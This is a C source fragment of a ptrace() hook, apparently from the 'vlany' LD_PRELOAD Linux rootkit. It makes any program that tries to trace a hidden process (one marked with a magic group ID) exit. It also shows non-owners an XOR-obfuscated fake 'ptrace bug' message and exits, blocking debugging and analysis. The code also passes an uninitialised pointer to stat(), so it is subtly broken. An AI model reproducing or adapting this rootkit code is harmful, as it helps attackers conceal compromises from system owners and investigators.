long ptrace(void *request, pid_t pid, void *addr, void *data)
{
    #ifdef DEBUG
        printf("[vlany] ptrace() called\n");
    #endif
    
    HOOK(old_ptrace, CPTRACE);
    
    char proc_path[128];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    
    HOOK(old_stat, CSTAT);
    struct stat *pstat;
    if(old_stat(proc_path, pstat) < 0) return old_ptrace(request, pid, addr, data);
    if(pstat->st_gid == MAGIC_GID) exit(-1);

    #ifndef PTRACE_BUG
        return old_ptrace(request, pid, addr, data);
    #endif

    if(owned()) return old_ptrace(request, pid, addr, data);

    char *ptrace_bug_msg = strdup(PTRACE_BUG_MSG);
    xor(ptrace_bug_msg);
    printf("%s\n", ptrace_bug_msg);
    cleanup(ptrace_bug_msg, strlen(ptrace_bug_msg));
    exit(-1);
}
